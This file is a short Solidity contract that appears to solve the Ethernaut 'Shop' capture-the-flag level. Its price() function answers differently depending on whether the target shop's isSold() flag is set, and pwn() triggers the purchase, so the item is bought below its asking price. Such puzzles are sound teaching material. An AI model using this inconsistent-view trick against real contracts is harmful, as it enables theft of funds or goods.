// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AngleBuyer {
    function price() external view returns (uint){
        if (IShop(msg.sender).isSold()) return 0;
        else return 100;
    }

    function pwn(IShop _shop) public {
        _shop.buy();
    }
}

interface IShop{
    function isSold() external view returns (bool);
    function buy() external;
}